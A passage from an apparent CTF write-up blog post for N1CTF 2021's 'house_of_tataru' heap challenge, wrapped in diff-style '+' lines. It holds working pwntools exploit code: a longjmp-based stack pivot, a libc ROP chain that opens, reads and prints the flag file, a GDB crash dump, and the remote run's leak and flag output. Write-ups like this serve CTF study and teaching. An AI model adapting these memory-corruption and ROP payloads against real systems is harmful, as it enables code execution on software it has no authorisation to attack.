+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">prepare</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># write exitfunc argument to BSS + 0x200	
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x210</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span>     <span class="c1"># rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x220</span><span class="p">)</span>         <span class="c1"># rsp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfacebabe</span><span class="p">)</span>        <span class="c1"># rip</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
+0x00000000facebabe in ?? ()
+───────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x41414141        
+$rbx   : 0x00007ffff7ffdf60  →  0x0000000041414141 ("AAAA"?)
+$rcx   : 0x1               
+$rdx   : 0x00005555555580f8  →  0x0000000000000000
+$rsp   : 0x0000555555558228  →  0x0000000000000000
+$rbp   : 0x00007ffff7fc21f5  →  &lt;longjmp+30&gt; mov rsp, QWORD PTR [rdi+0x30]
+$rsi   : 0x0000555555556229  →  0x002172656b636168 ("hacker!"?)
+$rdi   : 0x00005555555581e0  →  0x0000000000000000
+$rip   : 0xfacebabe        
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x0               
+$r11   : 0x246             
+$r12   : 0x00005555555581e0  →  0x0000000000000000
+$r13   : 0x0000555555558040  →  0x00007ffff7ffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$r14   : 0x0000555555558040  →  0x00007ffff7ffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$r15   : 0x130             
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+───────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x0000555555558228│+0x0000: 0x0000000000000000	 ← $rsp
+0x0000555555558230│+0x0008: 0x0000000000000000
+0x0000555555558238│+0x0010: 0x0000000000000000
+0x0000555555558240│+0x0018: 0x0000000000000000
+0x0000555555558248│+0x0020: 0x0000000000000000
+0x0000555555558250│+0x0028: 0x0000000000000000
+[!] Cannot access memory at address 0xfacebabe
+────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>What a journey, but finally we’re ropping :)</p>
+
+<p>So, all that’s left now, is to open/read/write the flag via our ropchain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">POPRAX</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">+</span> <span class="mh">0x0000000000016a96</span>
+<span class="n">POPRDI</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">+</span> <span class="mh">0x00000000000152a1</span>
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">+</span> <span class="mh">0x000000000001dad9</span>
+<span class="n">POPRDX</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">+</span> <span class="mh">0x000000000002cdae</span>
+<span class="n">SYSCALL</span> <span class="o">=</span><span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x00000000000238f0</span>
+
+<span class="c1"># write exitfunc argument to BSS + 0x200		
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x210</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span>   <span class="c1"># rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x220</span><span class="p">)</span>       <span class="c1"># rsp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
+
+<span class="c1"># open("./flag", 0, 0)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x200</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># read(3, BSS+0x400, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x200</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># write(1, BSS+0x400, 100)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x200</span><span class="o">+</span><span class="mh">0x200</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"./flag</span><span class="se">\x00</span><span class="s">"</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">exit</code> will now trigger the ropchain and print the flag.</p>
+
+<p>Due to the offset finder, the exploit will take quite some time to execute remote, since depending on the random gap between <code class="language-plaintext highlighter-rouge">bss</code> and <code class="language-plaintext highlighter-rouge">heap</code> it will need 300-20000 requests to find the correct offset to the heap.</p>
+
+<p>Since there were only challenge servers in China available, it would have taken hours to execute it, since the connection was extremely slow.</p>
+
+<p>Thanks to the organizers here for setting up a challenge server in Hong Kong, after we pointed out the slow connection. Connecting to that one via an AWS instance, the exploit ran a lot smoother and finished in about 5 minutes.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Test: 0x104b068
+[*] Test: 0x104c068
+[*] Test: 0x104d068
+[*] Test: 0x104e068
+[*] HEAP offset     : 0x104e060
+[*] HEAP leak       : 0x5559e56c20b8
+[*] HEAP base       : 0x5559e56c2000
+[*] BSS             : 0x5559e4673000
+[*] ELF             : 0x5559e466f000
+[*] LIBC leak       : 0x7fa4e4e1df10
+[*] LIBC            : 0x7fa4e4da9000
+[*] Switching to interactive mode
+hacker!n1ctf{U_Ar3_RE41LY_M43TeR_0f_Mus1!}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00timeout: the monitored command dumped core
+[*] Got EOF while reading in interactive
+$  </code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">n1ctf{U_Ar3_RE41LY_M43TeR_0f_Mus1!}</code></pre></figure>
+
+<p>Not so sure about that, but thanks ;-)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=N1CTF 2021 - house_of_tataru&amp;url=https://kileak.github.io/ctf/2021/n1ctf21-tataru/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/n1ctf21-tataru/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/n1ctf21-tataru';
+        var disqus_title = 'N1CTF 2021 - house_of_tataru';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/n1ctf21-tataru';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
